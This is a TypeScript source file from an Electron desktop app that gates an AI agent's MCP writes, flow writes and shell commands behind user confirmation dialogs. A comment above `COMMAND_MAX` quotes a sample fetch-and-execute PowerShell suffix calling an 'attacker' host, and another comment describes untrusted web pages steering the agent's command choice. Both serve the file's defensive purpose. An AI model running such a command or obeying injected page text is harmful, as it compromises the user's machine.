import type { BrowserWindow } from 'electron';
import { config } from '../config';
import { findBuiltinConnector } from '../../shared/builtinConnectors';
import { isWriteAutoApproved } from '../flow/agent/mcpTools';
import { sendLog } from '../helpers';
import { t } from '../i18n';
import { getMcpRegistry } from '../mcp';
import type { AgentConfirmRequest, McpConfirmRequest, ShellConfirmRequest } from '../flow/agent/agentEngine';
import type { FlowWriteConfirmRequest } from '../flow/agent/agentBuiltins';
import { askRenderer } from './agentConfirmBridge';
import type { CommandOrigin } from './commandOrigin';

type Strings = Record<string, string>;
type GetWin = () => BrowserWindow | null;

const ARGS_PREVIEW_LIMIT = 800;

async function confirmMcpWrite(
  req: McpConfirmRequest,
  getMainWin: GetWin,
  strings: Strings,
  origin: CommandOrigin,
): Promise<boolean> {
  // Sending and deleting are asked every time. "Always allow" was granted for edits; it was never a
  // standing permission to mail other people or throw the user's things away.
  if (!req.forceAsk && isWriteAutoApproved(config.mcpServers, req.serverId)) {
    sendLog(`🔓 [Agent] ${req.serverName}: ${req.toolName} — ${t(strings, 'agent.mcp.confirm.autoApproved')}`);
    return true;
  }
  if (origin === 'bot') {
    sendLog(`🔒 [Agent] ${req.serverName}: ${req.toolName} — ${t(strings, 'agent.mcp.confirm.botDenied')}`);
    return false;
  }

  // A built-in connector is not in config.mcpServers, so "always allow" had nowhere to be saved and
  // the button silently did nothing. It is hidden instead of pretending.
  const allowAlways = !req.forceAsk && !findBuiltinConnector(req.serverId);
  const argsPreview = JSON.stringify(req.args, null, 2);
  const choice = await askRenderer(getMainWin(), {
    kind: 'mcp',
    serverName: req.serverName,
    toolName: req.toolName,
    argsPreview: argsPreview.length > ARGS_PREVIEW_LIMIT ? `${argsPreview.slice(0, ARGS_PREVIEW_LIMIT)}…` : argsPreview,
    ...(req.rows?.length ? { rows: req.rows.map((row) => ({ ...row })) } : {}),
    allowAlways,
    danger: req.risk === 'external' || req.risk === 'destructive',
  });

  if (choice === 'approveAlways' && allowAlways) {
    getMcpRegistry()?.setAutoApproveWrites(req.serverId, true);
  }
  return choice !== 'deny';
}

async function confirmFlowWrite(
  req: FlowWriteConfirmRequest,
  getMainWin: GetWin,
  strings: Strings,
  origin: CommandOrigin,
): Promise<boolean> {
  if (origin === 'bot') {
    sendLog(`🔒 [Agent] ${req.flowName} — ${t(strings, 'agent.flow.confirm.botDenied')}`);
    return false;
  }

  const choice = await askRenderer(getMainWin(), {
    kind: 'flow',
    flowName: req.flowName,
    stepTypes: req.stepTypes,
    sensitiveTypes: req.sensitiveTypes,
  });
  return choice !== 'deny';
}

/**
 * A command longer than this is REFUSED, not clipped.
 *
 * The dialog previously showed `command.slice(0, 2_000)` while the engine ran the whole string,
 * so a 2,050-character action could show a plausible inventory one-liner and execute
 * `; iwr http://attacker/x.ps1 | iex` on the end of it. The user approved a prefix. A gate whose
 * displayed string can differ from the executed one is not a gate — so the two are now the same
 * string, and the only bound left is a refusal the user can see.
 */
const COMMAND_MAX = 8_000;
/*
 * EVERY command is asked, every time. There is deliberately no "allow for the rest of this run".
 *
 * That button was built and then removed: it is the only thing that turns one misjudged approval
 * into unlimited execution, and the risk it unlocks is not one the user can see coming. The agent
 * reads untrusted web pages into the same prompt that picks the next command, so the run that
 * earns the blanket and the run that abuses it are the same run. The cost of removing it is extra
 * clicks; the cost of keeping it is unbounded.
 *
 * `approveAlways` is therefore treated as a plain one-time approve if it ever arrives — the dialog
 * does not offer that button for a shell request, and a stray one must not widen anything.
 */
async function confirmShell(
  req: ShellConfirmRequest,
  getMainWin: GetWin,
  strings: Strings,
  origin: CommandOrigin,
): Promise<boolean> {
  if (origin === 'bot') {
    sendLog(`\u{1F512} [Agent] shell — ${t(strings, 'agent.shell.confirm.botDenied')}`);
    return false;
  }
  if (req.command.length > COMMAND_MAX) {
    sendLog(`\u{1F512} [Agent] shell: refused a ${req.command.length}-character command`);
    return false;
  }
  const choice = await askRenderer(getMainWin(), {
    kind: 'shell',
    // WHOLE, never clipped. The dialog scrolls it; what is shown is what runs.
    command: req.command,
    interpreter: req.interpreter,
    cwd: req.cwd,
  });

  return choice !== 'deny';
}

export function buildAgentConfirm(
  getMainWin: GetWin,
  strings: Strings,
  origin: CommandOrigin,
): (req: AgentConfirmRequest) => Promise<boolean> {
  return async (req) => {
    switch (req.kind) {
      case 'flow':
        return confirmFlowWrite(req, getMainWin, strings, origin);
      case 'shell':
        return confirmShell(req, getMainWin, strings, origin);
      default:
        return confirmMcpWrite(req, getMainWin, strings, origin);
    }
  };
}
